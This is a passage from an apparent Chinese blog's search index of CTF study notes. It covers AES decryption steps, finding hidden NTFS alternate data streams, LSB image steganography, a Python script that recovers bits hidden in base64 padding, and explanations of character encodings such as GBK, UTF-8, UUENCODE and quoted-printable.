src="https://upload-images.jianshu.io/upload_images/19601162-c088d299c207f72b.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="轮常量.PNG"><br>将字节代换的结果再与每轮相应的轮常量异或</p><h3 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h3><p><img src="https://upload-images.jianshu.io/upload_images/19601162-2b0a0b973ed601ed.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170219161202485.jpg"><br>加密过程与上述标题相同，解密过程与之相反<br>在第一轮中先进行逆行移位，再进行逆字节代换，在第二到十轮中先逆列混合，逆行移位，再逆字节代换</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AES</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ntfs隐写</title>
    <link href="/2020/05/05/ntfs%E9%9A%90%E5%86%99/"/>
    <url>/2020/05/05/ntfs%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>ntfs提取隐藏文件</p><a id="more"></a><h2 id="NTFS交换数据流（ADS）简介"><a href="#NTFS交换数据流（ADS）简介" class="headerlink" title="NTFS交换数据流（ADS）简介"></a>NTFS交换数据流（ADS）简介</h2><blockquote><p> 在NTFS文件系统中存在着NTFS交换数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。<br>   ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。<br> ADS也被用于一些恶意文件隐藏自身,作为后门</p></blockquote><p>学习戳<a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html" target="_blank" rel="noopener">https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html</a></p><h2 id="提取隐藏文件"><a href="#提取隐藏文件" class="headerlink" title="提取隐藏文件"></a>提取隐藏文件</h2><p>通过看了一些资料，找到了Ntfs Streams Editor这个工具，可以扫描到可疑文件<br><img src="https://upload-images.jianshu.io/upload_images/19601162-79d1842106f967a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="977035-20161116005326607-289849401.png"><br>图片来源：<a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html" target="_blank" rel="noopener">https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html</a><br>后来又学到了一种可以直接通过DOS命令查看的方法<br><code>dir /r</code>以只读查看文件(这里不知道为什么<code>dir /a:h</code>和<code>dir</code>都不行)<br><img src="https://upload-images.jianshu.io/upload_images/19601162-c25b3d0604557916.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ntfs.PNG"><br>然后输入notepad命令直接查看<br><code>notepad 293.txt:flag.txt</code></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LSB隐写</title>
    <link href="/2020/05/05/LSB%E9%9A%90%E5%86%99/"/>
    <url>/2020/05/05/LSB%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>LSB隐写</p><a id="more"></a><p>LSB即最低有效位</p><blockquote><p>png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写,jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。</p></blockquote><p>png图片由RGB三原色红绿蓝组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色。<br>LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位，每个像数可以携带3比特的信息。</p><h2 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h2><p>把图片拖进stegsolve,选中red,green,blue的最低0位，然后右侧选中LSB First，然后Save Bin<br><img src="https://upload-images.jianshu.io/upload_images/19601162-dce61a51902b6044.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="lsb.png"><br>以记事本形式打开文件，就可以找到flag了</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>base64隐写</title>
    <link href="/2020/05/05/base64%E9%9A%90%E5%86%99/"/>
    <url>/2020/05/05/base64%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>因为太菜了所以写不出脚本，找到了一位师傅写的好好分析一下</p><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>base64隐写只能用于有两个等号和有一个等号的情况<br><img src="https://upload-images.jianshu.io/upload_images/19601162-be8b316f572880c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20180917030350894.png!blog.png"></p><p>有两个等号的可以隐藏四位，当Base64解码时，这隐藏的四位会抹去<br>同理，有一个等号的能隐藏两位<br><img src="https://upload-images.jianshu.io/upload_images/19601162-908dc5e782022fd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20190517212307382.jpg.png"></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>学习来源<a href="https://www.jianshu.com/p/f1f4e10ad10e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1f4e10ad10e</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">b64chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line"></span><br><span class="line"># ccc.txt为待解密的base64隐写字符串所在的文件</span><br><span class="line">f &#x3D; open(&#39;ccc.txt&#39;,&#39;r&#39;)</span><br><span class="line">base64str &#x3D; f.readline()</span><br><span class="line"></span><br><span class="line"># pattern2用于匹配两个等号情况时，等号前的一个字符</span><br><span class="line"># pattern2用于匹配一个等号情况时，等号前的一个字符</span><br><span class="line">pattern2 &#x3D; r&#39;(\S)&#x3D;&#x3D;$&#39;</span><br><span class="line">pattern1 &#x3D; r&#39;(\S)&#x3D;$&#39;</span><br><span class="line"></span><br><span class="line"># 提取后的隐写二进制字符加入binstring中</span><br><span class="line">binstring &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 逐行读取待解密的base64隐写字符串，逐行处理</span><br><span class="line">while(base64str):</span><br><span class="line">    # 先匹配两个等号的情况，如果匹配不上，再配置一个等号的情况</span><br><span class="line">    # 如果无等号，则没有隐藏，无需处理</span><br><span class="line">    if re.compile(pattern2).findall(base64str):</span><br><span class="line">        # mstr为等号前的一个字符，该字符为隐写二进制信息所在的字符</span><br><span class="line">        mstr &#x3D; re.compile(pattern2).findall(base64str)[0]</span><br><span class="line">        # 确认mstr字符对应的base64二进制数，赋值给mbin</span><br><span class="line">        mbin &#x3D; bin(b64chars.find(mstr))</span><br><span class="line">        # mbin格式如0b100，mbin[0:2]为0b</span><br><span class="line">        # mbin[2:].zfill(6)为将0b后面的二进制数前面补0，使0b后面的长度为6</span><br><span class="line">        mbin2 &#x3D; mbin[0:2] + mbin[2:].zfill(6)</span><br><span class="line">        # 两个等号情况隐写了4位二进制数，所以提取mbin2的后4bit</span><br><span class="line">        # 赋值给stegobin，这就是隐藏的二进制信息</span><br><span class="line">        stegobin &#x3D; mbin2[-4:]</span><br><span class="line">        binstring +&#x3D; stegobin</span><br><span class="line">    elif re.compile(pattern1).findall(base64str):</span><br><span class="line">        mstr &#x3D; re.compile(pattern1).findall(base64str)[0]</span><br><span class="line">        mbin &#x3D; bin(b64chars.find(mstr))</span><br><span class="line">        mbin2 &#x3D; mbin[0:2] + mbin[2:].zfill(6)</span><br><span class="line">        # 一个等号情况隐写了2位二进制数，所以提取mbin2的后2bit</span><br><span class="line">        stegobin &#x3D; mbin2[-2:]</span><br><span class="line">        binstring +&#x3D; stegobin</span><br><span class="line">    base64str &#x3D; f.readline()</span><br><span class="line"></span><br><span class="line"># stegobin将各行隐藏的二进制字符拼接在一起</span><br><span class="line"># 从第0位开始，8bit、8bit处理，所以range的步进为8</span><br><span class="line">for i in range(0,len(binstring),8):</span><br><span class="line">    # int(xxx,2)，将二进制字符串转换为10进制的整数，再用chr()转为字符</span><br><span class="line">    print(chr(int(binstring[i:i+8],2)),end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="readline-方法"><a href="#readline-方法" class="headerlink" title="readline()方法"></a>readline()方法</h4><p>read() 读取整个文件，将文件内容放到一个字符串变量中<br>readline() readline()方法每次读取一行；返回的是一个字符串对象<br>readlines() 读取整个文件所有行，保存在一个列表(list)变量中，每行作为一个元素</p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><blockquote><p>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。<br>re 模块使 Python 语言拥有全部的正则表达式功能。 </p></blockquote><p>一般在正则表达式之前加r，防止字符转义</p><h5 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h5><p>1.”\s”：匹配空格<br>改成大写后，意思与原来相反<br> “\S”   匹配任意不是空白符的字符<br>2.元字符\^ 与$<br> \^  ：\^ 会匹配行或者字符串的起始位置，有时还会匹配整个文档的起始位置。<br> $ ：$ 会匹配行或字符串的结尾<br>详细用法<a href="https://www.cnblogs.com/zery/p/3438845.html]https://www.cnblogs.com/zery/p/3438845.html" target="_blank" rel="noopener">https://www.cnblogs.com/zery/p/3438845.html]https://www.cnblogs.com/zery/p/3438845.html</a></p><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><h6 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile()函数"></a>compile()函数</h6><p>compile()函数的定义中，可以看出返回的是一个匹配对象，它单独使用就没有任何意义，需要和findall(), search(), match(）搭配使用<br>compile()与findall()一起使用，返回一个列表。</p><p>在百度上看到的一个例子</p><blockquote><p>使用re的一般步骤是先使用re.compile()函数，将正则表达式的字符串形式编译为Pattern实例，然后使用Pattern实例处理文本并获得匹配结果（一个Match实例），最后使用Match实例获得信息，进行其他的操作。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">pattern &#x3D; re.compile(&#39;[a-zA-Z]&#39;)</span><br><span class="line">result &#x3D; pattern.findall(&#39;as3SiOPdj#@23awe&#39;)</span><br><span class="line">print result</span><br><span class="line"># [&#39;a&#39;, &#39;s&#39;, &#39;S&#39;, &#39;i&#39;, &#39;O&#39;, &#39;P&#39;, &#39;d&#39;, &#39;j&#39;, &#39;a&#39;, &#39;w&#39;, &#39;e&#39;]</span><br></pre></td></tr></table></figure><p>试了一下，原来re.compile(pattern2).findall(base64str)返回的列表中只有等号前字母一个元素<br>详细用法[<a href="https://blog.csdn.net/Darkman_EX/article/details/80973656]https://blog.csdn.net/Darkman_EX/article/details/80973656" target="_blank" rel="noopener">https://blog.csdn.net/Darkman_EX/article/details/80973656]https://blog.csdn.net/Darkman_EX/article/details/80973656</a></p><h4 id="zfill-方法"><a href="#zfill-方法" class="headerlink" title="zfill()方法"></a>zfill()方法</h4><p>用法  <code>str.zfill(width)</code><br>width — 指定字符串的长度。原字符串右对齐，前面填充0。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于编码的学习</title>
    <link href="/2020/02/24/%E5%87%A0%E7%A7%8D%E7%BC%96%E7%A0%81%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/02/24/%E5%87%A0%E7%A7%8D%E7%BC%96%E7%A0%81%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>昨天做题时发现一段乱码解不了密，一开始以为是编码的原因，结果是没有以二进制的形式打开，但还是学习了这些编码的区别和联系。</p><a id="more"></a><h2 id="ANSI-GBK-UTF"><a href="#ANSI-GBK-UTF" class="headerlink" title="ANSI,GBK,UTF"></a>ANSI,GBK,UTF</h2><p>学习来源:<a href="https://blog.csdn.net/qq_32087569/article/details/81946930" target="_blank" rel="noopener">https://blog.csdn.net/qq_32087569/article/details/81946930</a></p><h3 id="ANSI"><a href="#ANSI" class="headerlink" title="ANSI"></a>ANSI</h3><p>首先出现的是ASCII码，ANSI编码是一种对ASCII码的拓展,ANSI码仅在前126个与ASCII码相同，之后的字符全是某个国家语言的所有字符。</p><blockquote><p>还有ANSI编码其实包括很多编码：中国制定了GB2312编码，用来把中文编进去另外，日本把日文编到Shift_JIS里，韩国把韩文编到Euc-kr里，各国有各国的标准。受制于当时的条件，不同语言之间的ANSI码之间不能互相转换，这就会导致在多语言混合的文本中会有乱码。</p></blockquote><h3 id="GB2312-GBK-GB18030"><a href="#GB2312-GBK-GB18030" class="headerlink" title="GB2312 ,GBK,GB18030"></a>GB2312 ,GBK,GB18030</h3><p>GB2312 是对ANSI的中文扩展。<br>GBK 包括了 GB2312 的所有内容，同时又增加了近20000个新的汉字（包括繁体字）和符号。<br>再后来，GBK 扩成了 GB18030。</p><h3 id="UTF与unicode"><a href="#UTF与unicode" class="headerlink" title="UTF与unicode"></a>UTF与unicode</h3><blockquote><p>Unicode为了解决不同国家ANSI编码的冲突问题<br>UTF-8/16(8/16-bit Unicode Transformation Format):用于传输的unicode编码</p><p>Unicode（UCS）只是一个字符集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。<br>UTF（Unicode Translation Format），它是 Unicode （UCS）的实现（或存储）方式，称为 Unicode 转换格式。Unicode 的实现方式不同于编码方式。一个字符的 Unicode 编码是确定的。但是在实际传输过程中，由于不同系统平台的设计不一定一致，以及出于节省空间的目的，对 Unicode 编码的实现方式有所不同。<br>————————————————<br>版权声明：本文为CSDN博主「借我安适的清晨与傍晚」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_32087569/article/details/81946930" target="_blank" rel="noopener">https://blog.csdn.net/qq_32087569/article/details/81946930</a></p></blockquote><h3 id="utf-8-16-32"><a href="#utf-8-16-32" class="headerlink" title="utf-8/16/32"></a>utf-8/16/32</h3><p>UTF-8,UTF-16,UTF-32;<br>使用最广泛的是 UTF-8 方案，UTF-8 使用可变长度字节来储存 Unicode 字符;<br>UTF-16,UTF-32都是用的定长来表示字符</p><h2 id="UUENCODE与MIME编码"><a href="#UUENCODE与MIME编码" class="headerlink" title="UUENCODE与MIME编码"></a>UUENCODE与MIME编码</h2><p>最近做的题正好遇到这两种，也记录一下。</p><h3 id="UUENCODE"><a href="#UUENCODE" class="headerlink" title="UUENCODE"></a>UUENCODE</h3><p>UU编码学习戳<a href="http://blog.chacuo.net/753.html" target="_blank" rel="noopener">http://blog.chacuo.net/753.html</a><br>定义了用可打印字符表示二进制文字一种方法，并不是一种新的编码集合。主要解决，二进制字符在传输、存储中问题。它早期在电子邮件中使用较多，最近这些年来基本上被MIME 中Base64所取代了。</p><h4 id="编码过程"><a href="#编码过程" class="headerlink" title="编码过程"></a>编码过程</h4><p>Uuencode将输入资料以每三个字节为单位进行编码，如此重复进行。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6-bit为单位分为4个群组，每个群组以十进制来表示所出现的数值只会落在0到63之间。将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。<br>与base64的区别是UU编码后直接加上32找到对应的ASCII，而base64是通过映射表对照的</p><h3 id="MIME编码"><a href="#MIME编码" class="headerlink" title="MIME编码"></a>MIME编码</h3><p>MIME编码学习戳<a href="https://www.cnblogs.com/upzone/archive/2007/04/09/705286.html" target="_blank" rel="noopener">https://www.cnblogs.com/upzone/archive/2007/04/09/705286.html</a></p><blockquote><p>对邮件进行编码最初的原因是因为 Internet 上的很多网关不能正确传输8bit内码的字符，比如汉字等。编码的原理就是把8bit的内容转换成7bit的形式以能正确传输，在接收方收到之后，再将其还原成8bit的内容。<br>在MIME协议之前，邮件的编码曾经有过UUENCODE等编码方式 ，但是由于MIME协议算法简单，并且易于扩展，现在已经成为邮件编码方式的主流，不仅是用来传输8bit的字符，也可以用来传送二进制的文件，如邮件附件中的图像、音频等信息，而且扩展了很多基于MIME 的应用。目前http协议中，很多采用MIME框架。</p></blockquote><p>MIME定义了两种编码方法Base64与QP(Quote-Printable)</p><h4 id="QP编码"><a href="#QP编码" class="headerlink" title="QP编码"></a>QP编码</h4><p>QP编码学习戳<a href="https://www.cnblogs.com/xd502djj/p/4290470.html" target="_blank" rel="noopener">https://www.cnblogs.com/xd502djj/p/4290470.html</a><br>它是多用途互联网邮件扩展（MIME) 一种实现方式。<br>形式类似于这种”=B9=A4=D7=F7=BC=F2=B1=A8”,quoted-printable 就是说用一些可打印常用字符，表示一个字节（8位）中所有非打印字符方法。</p><h5 id="编码过程-1"><a href="#编码过程-1" class="headerlink" title="编码过程"></a>编码过程</h5><p>在所有ASCII码可打印字符中(33到126)和换行符都可以直接使用ASCII码表示而不用在前面加等号，除了“=”号必须使用”=3D”</p><h6 id="BUU上的一道QP编码"><a href="#BUU上的一道QP编码" class="headerlink" title="BUU上的一道QP编码"></a>BUU上的一道QP编码</h6><p>=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6<br>每三字节编码成为一个汉字，解码为“那你也很棒哦”</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
